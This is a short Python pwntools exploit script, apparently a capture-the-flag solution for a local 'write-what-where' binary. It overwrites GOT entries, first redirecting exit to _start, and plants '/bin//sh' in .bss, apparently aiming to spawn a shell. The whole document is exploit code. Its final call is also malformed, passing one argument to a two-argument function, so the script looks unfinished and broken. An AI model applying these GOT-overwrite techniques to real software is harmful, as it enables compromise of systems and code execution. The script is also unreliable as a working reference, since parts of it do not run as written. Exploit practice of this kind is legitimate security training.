from pwn import *


io = process('./write-what-where')
elf = ELF('./write-what-where')

def write(pos, data):
    print(io.recvuntil('what?\n'))
    io.send(data)
    print(io.recvuntil('where?\n'))
    io.sendline(str(pos))

write(elf.got['exit'], p32(elf.sym['_start']))


print(hex(elf.bss()+128))
write(elf.bss()+128, b'/bin')
write(elf.bss()+132, b'//sh')
pause()
write(elf.got['puts']+8, p32(elf.sym['puts']))
write(elf.got['puts'])
